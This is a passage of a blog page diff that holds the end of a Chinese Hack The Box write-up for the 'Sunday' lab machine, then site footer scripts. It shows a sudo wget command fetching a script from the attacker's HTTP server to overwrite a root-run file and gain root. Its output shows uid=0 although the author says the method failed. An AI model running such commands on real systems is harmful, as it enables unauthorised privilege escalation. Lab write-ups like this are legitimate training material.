</span><br>45b13c44727d8ba4a29bb770fd366d10<br>root@sunday:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>17、其实这里官方给的提示是使用wget把前面那个，把 &#x2F;root&#x2F;troll 给覆盖掉的方法来提权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop/test]<br>└─$ <span class="hljs-built_in">touch</span> exp.sh<br><br>┌──(kali㉿kali-linux-2022-2)-[~/Desktop/test]<br>└─$ vim exp.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br>bash<br><br>┌──(kali㉿kali-linux-2022-2)-[~/Desktop/test]<br>└─$ python3 -m http.server 8000<br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br>10.10.10.76 - - [05/Dec/2023 21:01:44] <span class="hljs-string">&quot;GET /exp.sh HTTP/1.1&quot;</span> 200 -<br><br>bash-4.4$ sudo /usr/bin/wget http://10.10.14.7:8000/exp.sh -O /root/troll<br>--2023-12-05 14:16:44--  http://10.10.14.7:8000/exp.sh<br>正在连接 10.10.14.7:8000... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：18 [text/x-sh]<br>正在保存至: “/root/troll”<br><br>/root/troll         100%[===================&gt;]      18  --.-KB/s  用时 0s      <br><br>2023-12-05 14:16:45 (1.15 MB/s) - 已保存 “/root/troll” [18/18])<br><br>bash-4.4$<br><br>sunny@sunday:~$ sudo /root/troll<br>testing<br>uid=0(root) gid=0(root)<br>sunny@sunday:~$<br></code></pre></td></tr></table></figure>
+
+<p>18、然而在实际中，这个方法并不管用，并没有提权成功。</p>
+<p>19、这个靶机整体过了一遍后，还是感觉比较烂，枚举用户名称烂、密码设置的烂，官方的引导方法也烂。</p>
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/achievement/machine/1705469/136">https://www.hackthebox.com/achievement/machine/1705469/136</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Sunday-htb-writeup</div>
+      <div>https://sh1yan.top/2023/12/05/Sunday-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/06/Irked-htb-writeup/" title="Irked-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Irked-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/04/Nibbles-htb-writeup/" title="Nibbles-htb-writeup">
+                        <span class="hidden-mobile">Nibbles-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
